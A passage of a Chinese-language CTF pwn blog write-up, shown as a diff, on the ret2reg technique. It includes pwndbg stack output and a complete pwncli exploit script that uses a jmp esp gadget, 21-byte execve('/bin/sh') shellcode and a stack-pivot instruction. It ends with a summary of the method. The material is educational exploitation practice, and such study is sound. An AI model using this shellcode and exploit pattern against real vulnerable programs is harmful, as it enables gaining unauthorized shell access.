(__libc_start_call_main+<span class="hljs-number">121</span>) ◂— add esp, <span class="hljs-number">0x10</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0xffffc2a0</span> —▸ <span class="hljs-number">0xffffc534</span> ◂— <span class="hljs-number">0x746e6d2f</span> (<span class="hljs-string">&#x27;/mnt&#x27;</span>)<br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│+<span class="hljs-number">00</span>c <span class="hljs-number">0xffffc2a4</span> ◂— <span class="hljs-number">0x70</span> <span class="hljs-comment">/* &#x27;p&#x27; */</span><br><span class="hljs-number">07</span>:<span class="hljs-number">001</span>c│+<span class="hljs-number">010</span> <span class="hljs-number">0xffffc2a8</span> —▸ <span class="hljs-number">0xf7ffd000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-number">0x36f2c</span><br>───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0</span> <span class="hljs-number">0x8048550</span> pwn+<span class="hljs-number">149</span><br>   <span class="hljs-number">1</span> <span class="hljs-number">0x804856f</span> main+<span class="hljs-number">22</span><br>   <span class="hljs-number">2</span> <span class="hljs-number">0xf7d97519</span> __libc_start_call_main+<span class="hljs-number">121</span><br>   <span class="hljs-number">3</span> <span class="hljs-number">0xf7d975f3</span> __libc_start_main+<span class="hljs-number">147</span><br>   <span class="hljs-number">4</span> <span class="hljs-number">0x80483e1</span> _start+<span class="hljs-number">33</span><br>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt;<br></code></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong>exp</strong></li>
-</ol>
+<p>通过 ret2reg打 shellcode。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241231195852.png'><img src="/assets/Pasted%20image%2020241231195852.png"></p>
+<p>但是我们溢出长度只有 18 个字节，并不足够在<code>jmp esp</code>后拼接上 shellcode。</p>
+<p>所以我们仍然要通过简单的汇编指令来将栈帧迁移到 payload 的前部分，然后在 payload 的前部分拼接上我们的 shellcode。</p>
+<p>这里使用的是手写的汇编，因为 pwntools 生成的太长了，都超出填充长度了。。。</p>
+<ul>
+<li>exp</li>
+</ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>jmp_esp = <span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;jmp esp&#x27;</span>)))<br>shellcode=<span class="hljs-string">b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span><br>payload = shellcode.ljust(<span class="hljs-number">36</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+ p32(jmp_esp) + asm(<span class="hljs-string">&#x27;sub esp,40;jmp esp&#x27;</span>)<br>r()<br>sl(payload)<br><br>ia()<br></code></pre></td></tr></table></figure>
 
-<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>总结：如果溢出字节足够长就直接通过<code>jmp reg</code>执行shellcode，如果溢出不够长就构造汇编指令将栈指针进行一个迁移执行 shellcode。</p>
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>总结：如果溢出字节足够长就在<code>jmp reg</code>指令后拼接执行 shellcode，如果溢出不够长就构造汇编指令将栈指针迁移到payload 前部分 然后在 payload 前部分拼接上 shellcode 执行。</p>
 <blockquote>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/binexp/stack/reliable-shellcode/using-rsp">Using RSP | Cybersec (gitbook.io)</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/binexp/stack/reliable-shellcode/using-rsp">Using RSP | Cybersec (gitbook.io)</a></p>
 </blockquote>
 <div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/24/system/system-1/">← Next 《操作系统真象还原》chapter1 环境搭建</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/24/sundry/cmake/">CMake学习 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">4.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
